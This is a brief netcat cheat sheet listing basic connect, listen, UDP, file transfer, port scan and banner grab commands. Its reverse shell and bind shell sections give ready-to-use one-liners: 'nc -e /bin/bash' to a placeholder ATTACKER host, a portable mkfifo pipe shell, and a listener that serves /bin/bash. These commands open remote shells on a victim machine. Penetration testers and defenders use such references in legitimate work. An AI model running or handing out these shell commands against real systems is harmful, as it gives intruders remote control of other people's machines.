# netcat — the TCP/IP swiss army knife

## Connect / listen
nc target 80                    # open a TCP connection
nc -lvnp 4444                   # listen: verbose, no-dns, port 4444
nc -u target 53                 # UDP mode

## Reverse shell
# on attacker
nc -lvnp 4444
# on victim
nc -e /bin/bash ATTACKER 4444
# without -e (portable)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

## Bind shell
# on victim
nc -lvnp 4444 -e /bin/bash
# on attacker
nc VICTIM 4444

## File transfer
# receiver
nc -lvnp 4444 > out.bin
# sender
nc target 4444 < in.bin

## Port scan
nc -zvn target 20-80            # zero-I/O scan of a range

## Banner grab
echo "" | nc -vn target 22
